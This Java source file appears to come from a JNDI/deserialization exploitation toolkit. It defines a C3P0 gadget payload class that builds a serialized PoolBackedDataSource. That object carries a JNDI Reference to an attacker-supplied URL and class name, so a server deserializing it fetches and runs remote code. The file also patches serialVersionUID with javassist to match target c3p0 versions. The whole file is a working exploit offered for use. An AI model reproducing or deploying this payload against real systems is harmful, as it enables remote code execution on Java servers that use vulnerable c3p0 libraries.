package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.SuClassLoader;
import com.qi4l.jndi.gadgets.utils.handle.ClassFieldHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;


/**
 * C3P0 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
 */

@Dependencies({"com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8", "com.mchange:mchange-commons-java:0.2.11"})
@Authors({Authors.MBECHLER})
public class C3P092 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url       = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // 修改com.mchange.v2.c3p0.PoolBackedDataSource serialVerisonUID

        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(Class.forName("com.mchange.v2.c3p0.PoolBackedDataSource")));
        final CtClass ctPoolBackedDataSource = pool.get("com.mchange.v2.c3p0.PoolBackedDataSource");

        ClassFieldHandler.insertField(ctPoolBackedDataSource, "serialVersionUID", "private static final long serialVersionUID = 7387108436934414104L;");

        // mock method name until armed
        final Class clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());

        Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
        Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;

        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
    }

}
